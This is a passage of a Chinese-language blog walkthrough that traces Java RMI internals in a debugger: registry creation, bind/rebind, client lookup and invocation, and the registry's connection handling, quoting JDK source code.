+<p>继续跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231064605383.png"
+                      alt="image-20231231064605383"
+                ></p>
+<p>首先就是进行一个安全检查</p>
+<p>最终就是到达else里面</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LiveRef lref = new LiveRef(id, port);</span><br><span class="line">setup(new UnicastServerRef(lref, RegistryImpl::registryFilter));</span><br></pre></td></tr></table></figure></div>
+
+<p>先是创建了一个LiveRef对象，传入了参数id和端口号。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231122333333.png"
+                      alt="image-20231231122333333"
+                ></p>
+<p>这里和我们在分析远程对象创建的过程是一样的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231122532810.png"
+                      alt="image-20231231122532810"
+                ></p>
+<p>只不过这里端口不再是0，而是我们设置的1099</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231122606724.png"
+                      alt="image-20231231122606724"
+                ></p>
+<p>然后后面创建了UnicastServerRef对象，传入了我们创建的LiveRef对象</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231122935972.png"
+                      alt="image-20231231122935972"
+                ></p>
+<p>跟进后是调用了UnicastServerRef的exportObject方法</p>
+<p>到这里我们可以看到这里的流程和我们前面分析远程对象服务的过程是一样的</p>
+<p>我们这里回顾一下远程服务对象的调用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231124132975.png"
+                      alt="image-20231231124132975"
+                ></p>
+<p>同样的还是调用UnicastServerRef的exportObject方法</p>
+<p>但是这里有一个区别，由上图我们可以看到在远程对象创建的时候传入了三个参数，obj也就是我们的远程对象，null和false</p>
+<p>然后我们看一下注册中心创建时传入的三个参数是：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240102154519421.png"
+                      alt="image-20240102154519421"
+                ></p>
+<p>这里可以看到传入的第三个参数是true</p>
+<p>我们这里跟进去看一下这个参数是干什么的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240102155025540.png"
+                      alt="image-20240102155025540"
+                ></p>
+<p>传入的参数是parmanent</p>
+<p><code>boolean permanent</code> 参数表示导出的远程对象是否是永久性的。具体来说，当 <code>permanent</code> 参数设置为 <code>true</code> 时，表示导出的远程对象是永久性的，它不会因为长时间没有被使用而被自动取消导出。相反，如果设置为 <code>false</code>，则表示导出的远程对象是暂时性的，它有可能因为一段时间没有被使用而被自动取消导出，以释放资源。</p>
+<p>这就代表我们这里在注册中心创建的是一个永久对象，而在远程对象创建的是一个临时的。</p>
+<p> 然后后面还是一样的。创建stub</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112164707776.png"
+                      alt="image-20240112164707776"
+                ></p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112164824662.png"
+                      alt="image-20240112164824662"
+                ></p>
+<p>这个地方是和前面创建远程对象不一样的一个地方</p>
+<p>我们这里跟进到stubClassExists这个方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112165020242.png"
+                      alt="image-20240112165020242"
+                ></p>
+<p>这里会检查这个stub类是否存在</p>
+<p>然后再创建注册中心的时候对应的stub类是存在的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112165556922.png"
+                      alt="image-20240112165556922"
+                ></p>
+<p>这个类是jdk自带的类，</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112165952542.png"
+                      alt="image-20240112165952542"
+                ></p>
+<p>这个方法主要是检查创建的stub是否以及存在了，存在了就返回true，否则就返回false</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112170047720.png"
+                      alt="image-20240112170047720"
+                ></p>
+<p>然后就会调用这个creatstub去生成这个stub</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112170425424.png"
+                      alt="image-20240112170425424"
+                ></p>
+<p>这里就是动态加载 stub 类，并使用反射机制实例化它</p>
+<p>在 exportObject 方法中，重要的一步就是使用 <code>Util.createProxy()</code> 来创建动态代理，之前提到对远程对象使用 RemoteObjectInvocationHandler 来创建，但是之前有一个 stubClassExists 的判断。</p>
+<p>这里就是和创建远程对象不同的地方，由于创建的stub类是存在的导致进入if里面调用createstub创建stub，但是再创建远程对象的时候是不存在的，所以再创建远程的对象的时候使用的是RemoteObjectInvocationHandler 来创建的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112171026084.png"
+                      alt="image-20240112171026084"
+                ></p>
+<p>上面创建完代理类后，会调用UnicastServerRef 类的setSkeleton 方法创建Skeleton，这个Skeleton就是服务端的代理对象。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112171413144.png"
+                      alt="image-20240112171413144"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20240112172750333.png"
+                      alt="image-20240112172750333"
+                ></p>
+<p>这里也就是调用classforname创建了Skeleton,然后进行了实例化。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112180138075.png"
+                      alt="image-20240112180138075"
+                ></p>
+<p>这里可以看到里面多了一个skel，那么这里其实就是impl里面放入了一个服务端的代理对象skel（Skeleton）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112180509270.png"
+                      alt="image-20240112180509270"
+                ></p>
+<p>后面和在创建远程对象的时候都是一样的，将创建的这些远程服务都放到创建的target里面。后面就是将这个封装好的target给发布出去。具体和创建远程对象的时候是一样的，这里就不再详细分析了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112182104896.png"
+                      alt="image-20240112182104896"
+                ></p>
+<p>最终写入到objTable和implTable这两个表里面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112182256759.png"
+                      alt="image-20240112182256759"
+                ></p>
+<p>我们可以看到在这个表里面是存在我们创建的对象。</p>
+<p>那么根据我们上面的分析我们大概可以知道创建远程对象和创建注册中心不一样的地方：</p>
+<p>注册中心与远程服务对象注册的大部分流程相同，差异在：</p>
+<p>远程服务对象使用动态代理，invoke 方法最终调用 UnicastRef 的 invoke 方法，注册中心使用 RegistryImpl_Stub，同时还创建了 RegistryImpl_Skel</p>
+<p>远程对象默认随机端口，注册中心默认是 1099（当然也可以指定）</p>
+<p>上面我们分析了创建注册中心的流程，然后我们这里开始分析一下服务绑定的流程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112182903962.png"
+                      alt="image-20240112182903962"
+                ></p>
+<p>这里调用注册中心的rebind方法进行远程服务的绑定，我们这里跟进看一下流程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112182948794.png"
+                      alt="image-20240112182948794"
+                ></p>
+<p>这里的bindings其实就是一个hash表</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112183415702.png"
+                      alt="image-20240112183415702"
+                ></p>
+<p>就是将 Remote 对象和名称 String 放在成员变量 bindings 中。</p>
+<p>其实还有一个绑定方法是bind和rebind其实是一样的</p>
+<p>只不过对于同一名称的绑定，<code>bind</code> 方法会抛出 <code>AlreadyBoundException</code> 异常，而 <code>rebind</code> 方法会覆盖已有的绑定而不抛出异常。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112183806191.png"
+                      alt="image-20240112183806191"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112183817725.png"
+                      alt="image-20240112183817725"
+                ></p>
+<p>可以看到在bind中首先就是通过调用bindings的get方法在或者hash表对象中去查找是否已经存在该名称，存在的话就抛出异常</p>
+<p>而rebind是直接覆盖，不抛出异常。</p>
+<p>一般来说注册中心和服务端是要在一台机器上面的，但是在一些低版本jdk是允许将服务端和注册中心不放在一起唉，如果远程对象和注册中心不在一起这个时候就要先获取到Registry 对象。</p>
+<p>无论是使用 Naming 或者 LocateRegistry 都是调用 <code>LocateRegistry.getRegistry()</code> 方法来创建 Registry，这部分的创建过程与注册中心注册时的过程是一致的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240112184636917.png"
+                      alt="image-20240112184636917"
+                ></p>
+<h3 id="3、客户端请求注册中心-客户端"><a href="#3、客户端请求注册中心-客户端" class="headerlink" title="3、客户端请求注册中心-客户端"></a>3、客户端请求注册中心-客户端</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(&quot;192.168.137.1&quot;, 1099);</span><br><span class="line">rmi hello = (RMIfenxi.rmi) registry.lookup(&quot;hello&quot;);</span><br><span class="line">System.out.println(hello.hello());</span><br></pre></td></tr></table></figure></div>
+
+<p>这个就是客户端去进行远程方法调用的代码实现，首先就是获取到注册中心RMI注册表的引用，然后调用lookup方法从RMI注册表中查找名为 “hello” 的远程对象。<code>lookup</code> 方法返回对远程对象的引用，需要将其转换为适当的接口或类类型。获取到远程对象就可以调用相应的远程方法。</p>
+<p>我们这里打断点具体分析一下调用流程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118141617910.png"
+                      alt="image-20240118141617910"
+                ></p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118141837821.png"
+                      alt="image-20240118141837821"
+                ></p>
+<p>我们可以看到这里获取远程对象并不是通过序列化反序列化的方式实现的，而是在本地新建了一个liveRef对象，然后作为参数传进了新建的RemoteRef对象。</p>
+<p>最终是调用这个createProxy方法，这个方法我们在服务端创建stub时也用过，我们这里这个创建代理的方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118150625737.png"
+                      alt="image-20240118150625737"
+                ></p>
+<p>分析到这里我们可以看到，虽然是客户端从注册中心获取到stub，但是注册中心并不是通过序列化&#x2F;反序列化的方式直接将整个stub对象传给了客户端，而是客户端本地新建了一个包含了具体通信地址、端口的 RegistryImpl_Stub 对象。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118151115342.png"
+                      alt="image-20240118151115342"
+                ></p>
+<p>这里和创建注册中心是一样的，调用createStub方法在本地实例化了一个RegistryImpl_Stub 对象。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118151540477.png"
+                      alt="image-20240118151540477"
+                ></p>
+<p>然后这里就获取到了注册中心的远程对象，然后我们可以看到我们获取到这个远程对象里面其实也还是一个Liveref，包含了远程注册中心的地址和端口。我们这里其实也就是获取到了注册中心的一个stub对象，那么后面就是通过这个stub对象获取我们想要调用的远程方法的stub对象，我们在前面创建远程服务对象的时候，其实也就是创建了一个stub对象绑定到注册中心上面，而不是真正的远程对象实体。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118152905162.png"
+                      alt="image-20240118152905162"
+                ></p>
+<p>首先就是通过<code>StreamRemoteCall call = (StreamRemoteCall)ref.newCall(this, operations, 2, interfaceHash);</code>创建一个连接，也就是使用给定的远程引用 (<code>ref</code>) 创建一个 <code>StreamRemoteCall</code> 对象，该对象表示一次远程调用。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118153347492.png"
+                      alt="image-20240118153347492"
+                ></p>
+<p>然后就是将获取到一个输出流，这里也就是将我们传入的要调用的远程方法名进行序列化，那么注册中心相应会存在一个反序列化。这里先不分析注册中心的反序列化，我们继续向下分析：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118153622255.png"
+                      alt="image-20240118153622255"
+                ></p>
+<p>对查找的方法进行序列化后，然后通过我们创建的连接调用invoke方法其实这里invoke是进行网络通信的</p>
+<p>我们这里可以跟进去看看：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118153944477.png"
+                      alt="image-20240118153944477"
+                ></p>
+<p>继续跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118154047972.png"
+                      alt="image-20240118154047972"
+                ></p>
+<p>到这里真正实现网络通信的就是这个executeCall方法。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118154239544.png"
+                      alt="image-20240118154239544"
+                ></p>
+<p>上面我们将序列化的方法名传递给注册中心，然后会对响应结果进行反序列化。那么这里的这个result就是注册中心返回的动态代理对象。也就是我们要调用的远程方法的stub对象。</p>
+<h3 id="4、客户端请求服务端-客户端"><a href="#4、客户端请求服务端-客户端" class="headerlink" title="4、客户端请求服务端-客户端"></a>4、客户端请求服务端-客户端</h3><p>我们这里获取到远程对象的stub代理对象，那么后面就是通过这个代理对象与服务端通信调用远程的对象方法了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118161327116.png"
+                      alt="image-20240118161327116"
+                ></p>
+<p>跟进去看一下调用流程：</p>
+<p>这里的hello是我们获取的一个动态代理，动态代理无论你调用什么方法都会调用到invoke方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118163206500.png"
+                      alt="image-20240118163206500"
+                ></p>
+<p>这个方法首先就是通过if判断去检查代理的是否是一个可用的代理对象。</p>
+<p>然后检查调用的方法是否是一个object类的方法，是的话则调用<code>invokeObjectMethod(proxy, method, args);</code>进行处理，如果不是检查被调用的方法是否是 <code>finalize</code> 方法，并且不允许调用 <code>finalize</code>。如果是，返回 <code>null</code> 表示忽略此调用。不是则调用<code>invokeRemoteMethod(proxy, method, args);</code>进行处理</p>
+<p>我们这里是调用了<code>invokeRemoteMethod(proxy, method, args);</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118163945978.png"
+                      alt="image-20240118163945978"
+                ></p>
+<p>跟进到这个方法我们可以看到是调用了ref的invoke方法。</p>
+<p>继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118164219131.png"
+                      alt="image-20240118164219131"
+                ></p>
+<p>这里通过<code>ref.getChannel().newConnection();</code>新建了一个连接对象</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118191816146.png"
+                      alt="image-20240118191816146"
+                ></p>
+<p>这里使用循环遍历方法的参数类型数组，对每个参数进行序列化并写入输出流中。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118192527476.png"
+                      alt="image-20240118192527476"
+                ></p>
+<p><code>marshalValue</code>是一个用于序列化给定类型的值到输出流的自定义方法。这是为了将方法参数转换为字节流，以便在远程调用中传递。我们跟进到这个方法里面可以看到，这个方法是根据类型的不同采用不同的序列化策略。而这个值就是我们调用方法时传入的参数的值。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118192842910.png"
+                      alt="image-20240118192842910"
+                ></p>
+<p>对传入的参数进行序列化后，可与看到这里又调用了<code>executeCall()</code>方法，分析到这里我们可以发现只要是客户端的请求都会调用这个方法进行网络通信。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118193147064.png"
+                      alt="image-20240118193147064"
+                ></p>
+<p>这里从 <code>StreamRemoteCall</code> 对象 <code>call</code> 中获取输入流，用于读取从远程方法调用返回的数据。反序列化的实现是在这个<code>unmarshalValue</code>这个自定义方法中实现的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118193336272.png"
+                      alt="image-20240118193336272"
+                ></p>
+<p>同样是根据值的类型实行不同的反序列化策略</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240118193453624.png"
+                      alt="image-20240118193453624"
+                ></p>
+<p>根据调试信息是可以看到这里是通过反序列化读取到了返回信息。</p>
+<h3 id="5、客户端请求注册中心-注册中心"><a href="#5、客户端请求注册中心-注册中心" class="headerlink" title="5、客户端请求注册中心-注册中心"></a>5、客户端请求注册中心-注册中心</h3><p>我们上面分析了客户端请求注册中心的时候在客户端部分的调用流程，我们这里分析当注册中心收到客户端的请求后，注册中心的调用流程：</p>
+<p>我们前面在分析创建注册中心的流程时，创建注册中心的时候在服务端开启了一个监听。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240119161915355.png"
+                      alt="image-20240119161915355"
+                ></p>
+<p>跟进到这个listen方法·</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240119162048633.png"
+                      alt="image-20240119162048633"
+                ></p>
+<p>在listen方法里面我们可以看到是开启了一个新线程，用于接受远程调用。然后对这个接受的远程调用就在这个新线程里面进行了处理，跟进到这个处理线程里面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240119162241140.png"
+                      alt="image-20240119162241140"
+                ></p>
+<p>在这个线程的run方法里面写了一个处理的<code>executeAcceptLoop()</code>方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void executeAcceptLoop() &#123;</span><br><span class="line">    if (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">        tcpLog.log(Log.BRIEF, &quot;listening on port &quot; +</span><br><span class="line">                   getEndpoint().getPort());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    while (true) &#123;</span><br><span class="line">        Socket socket = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            socket = serverSocket.accept();</span><br><span class="line"></span><br><span class="line">            /*</span><br><span class="line">             * Find client host name (or &quot;0.0.0.0&quot; if unknown)</span><br><span class="line">             */</span><br><span class="line">            InetAddress clientAddr = socket.getInetAddress();</span><br><span class="line">            String clientHost = (clientAddr != null</span><br><span class="line">                                 ? clientAddr.getHostAddress()</span><br><span class="line">                                 : &quot;0.0.0.0&quot;);</span><br><span class="line"></span><br><span class="line">            /*</span><br><span class="line">             * Execute connection handler in the thread pool,</span><br><span class="line">             * which uses non-system threads.</span><br><span class="line">             */</span><br><span class="line">            try &#123;</span><br><span class="line">                connectionThreadPool.execute(</span><br><span class="line">                    new ConnectionHandler(socket, clientHost));</span><br><span class="line">            &#125; catch (RejectedExecutionException e) &#123;</span><br><span class="line">                closeSocket(socket);</span><br><span class="line">                tcpLog.log(Log.BRIEF,</span><br><span class="line">                           &quot;rejected connection from &quot; + clientHost);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>这个方法首先就是接受了客户端的请求，然后获取了客户端的ip地址</p>
+<p>但是这里可以看到，接受请求后，又创建了一个线程<code>new ConnectionHandler(socket, clientHost)</code></p>
+<p>这里也就是接受到客户端请求后，将这个请求交给这个线程处理</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240119162858471.png"
+                      alt="image-20240119162858471"
+                ></p>
+<p>跟进这个线程，继续分析这个线程的run方法，在这个方法里面首先就是设置了线程的名称，以及执行run0方法然后再run0方法被执行后还原这个线程的名称。继续跟进到这个run0方法。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">byte protocol = in.readByte();</span><br><span class="line">switch (protocol) &#123;</span><br><span class="line">case TransportConstants.SingleOpProtocol:</span><br><span class="line">    // no ack for protocol</span><br><span class="line"></span><br><span class="line">    // create dummy channel for receiving messages</span><br><span class="line">    ep = new TCPEndpoint(remoteHost, socket.getLocalPort(),</span><br><span class="line">                         endpoint.getClientSocketFactory(),</span><br><span class="line">                         endpoint.getServerSocketFactory());</span><br><span class="line">    ch = new TCPChannel(TCPTransport.this, ep);</span><br><span class="line">    conn = new TCPConnection(ch, socket, bufIn, bufOut);</span><br><span class="line"></span><br><span class="line">    // read input messages</span><br><span class="line">    handleMessages(conn, false);</span><br><span class="line">    break;</span><br><span class="line"></span><br><span class="line">case TransportConstants.StreamProtocol:</span><br><span class="line">    // send ack</span><br><span class="line">    out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line"></span><br><span class="line">    // suggest endpoint (in case client doesn&#x27;t know host name)</span><br><span class="line">    if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">            &quot;) &quot; + &quot;suggesting &quot; + remoteHost + &quot;:&quot; +</span><br><span class="line">            remotePort);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out.writeUTF(remoteHost);</span><br><span class="line">    out.writeInt(remotePort);</span><br><span class="line">    out.flush();</span><br><span class="line"></span><br><span class="line">    // read and discard (possibly bogus) endpoint</span><br><span class="line">    // REMIND: would be faster to read 2 bytes then skip N+4</span><br><span class="line">    String clientHost = in.readUTF();</span><br><span class="line">    int    clientPort = in.readInt();</span><br><span class="line">    if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">            &quot;) client using &quot; + clientHost + &quot;:&quot; + clientPort);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // create dummy channel for receiving messages</span><br><span class="line">    // (why not use clientHost and clientPort?)</span><br><span class="line">    ep = new TCPEndpoint(remoteHost, socket.getLocalPort(),</span><br><span class="line">                         endpoint.getClientSocketFactory(),</span><br><span class="line">                         endpoint.getServerSocketFactory());</span><br><span class="line">    ch = new TCPChannel(TCPTransport.this, ep);</span><br><span class="line">    conn = new TCPConnection(ch, socket, bufIn, bufOut);</span><br><span class="line"></span><br><span class="line">    // read input messages</span><br><span class="line">    handleMessages(conn, true);</span><br><span class="line">    break;</span><br><span class="line"></span><br><span class="line">case TransportConstants.MultiplexProtocol:</span><br><span class="line">    if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">            &quot;) accepting multiplex protocol&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // send ack</span><br><span class="line">    out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line"></span><br><span class="line">    // suggest endpoint (in case client doesn&#x27;t already have one)</span><br><span class="line">    if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">            &quot;) suggesting &quot; + remoteHost + &quot;:&quot; + remotePort);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out.writeUTF(remoteHost);</span><br><span class="line">    out.writeInt(remotePort);</span><br><span class="line">    out.flush();</span><br><span class="line"></span><br><span class="line">    // read endpoint client has decided to use</span><br><span class="line">    ep = new TCPEndpoint(in.readUTF(), in.readInt(),</span><br><span class="line">                         endpoint.getClientSocketFactory(),</span><br><span class="line">                         endpoint.getServerSocketFactory());</span><br><span class="line">    if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        tcpLog.log(Log.VERBOSE, &quot;(port &quot; +</span><br><span class="line">            port + &quot;) client using &quot; +</span><br><span class="line">            ep.getHost() + &quot;:&quot; + ep.getPort());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ConnectionMultiplexer multiplexer;</span><br><span class="line">    synchronized (channelTable) &#123;</span><br><span class="line">        // create or find channel for this endpoint</span><br><span class="line">        ch = getChannel(ep);</span><br><span class="line">        multiplexer =</span><br><span class="line">            new ConnectionMultiplexer(ch, bufIn, sockOut,</span><br><span class="line">                                      false);</span><br><span class="line">        ch.useMultiplexer(multiplexer);</span><br><span class="line">    &#125;</span><br><span class="line">    multiplexer.run();</span><br><span class="line">    break;</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line">    // protocol not understood, send nack and close socket</span><br><span class="line">    out.writeByte(TransportConstants.ProtocolNack);</span><br><span class="line">    out.flush();</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>run0前半部分是基于 Java RMI 的服务端处理逻辑，用于接受来自客户端的请求，并在接收到请求后进行一系列的处理，包括检测是否有 HTTP 封装、验证协议头等。我们主要看这后半部分，后半部分通过一个switch用于根据读取到的协议类型（<code>protocol</code>）来执行不同的处理逻辑，主要涉及到 SingleOpProtocol、StreamProtocol 和 MultiplexProtocol 这三种协议。</p>
+<p>根据前面客户端请求注册中心的分析，可以知道，客户端是通过序列化进行传输的，那么这里就会触发这个StreamProtocol 逻辑调用<code>handleMessages()</code>进行处理。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240119164828359.png"
+                      alt="image-20240119164828359"
+                ></p>
+<p>再<code>handleMessages()</code>会从输入流中读出操作码，然后根据操作码执行不同的逻辑。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240119164909214.png"
+                      alt="image-20240119164909214"
+                ></p>
+<p>这段代码主要写了三种类型的处理逻辑：RMI调用，ping请求和DGC 确认。我们这里是RMI调用这里就会调用<code>TransportConstants.Call</code>:处理逻辑进行处理。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240119165220775.png"
+                      alt="image-20240119165220775"
+                ></p>
+<p>RMI的调用处理逻辑里面还是调用这个serviCall方法进行处理</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240119165622118.png"
+                      alt="image-20240119165622118"
+                ></p>
+<p>在这个serviceCall方法里面，从 ObjectTable 中获取封装的 Target 对象</p>
+<p>这个Target和OBjectable我们应该很熟悉了，我们在服务端创建远程服务或者注册中心的时候最终都会将封装的Target放入到这个objectTable里面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240119170241251.png"
+                      alt="image-20240119170241251"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20240119170323910.png"
+                      alt="image-20240119170323910"
